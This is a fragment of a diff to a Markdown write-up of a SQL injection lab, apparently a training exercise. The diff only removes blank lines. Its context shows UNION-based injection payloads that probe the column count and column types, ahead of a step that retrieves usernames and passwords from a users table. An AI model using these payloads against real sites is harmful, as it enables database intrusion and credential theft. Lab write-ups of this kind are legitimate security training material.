@@ -17,13 +17,11 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 ' UNION SELECT NULL,NULL--
 ```
  
-
 2/ Determine the data type of columns
 
 ```sql
 ' UNION SELECT 'AAA', 'AAA'--
 ```
-
 
 3/ Retrieve data for the table "users" and the columns "username" and "password"
 
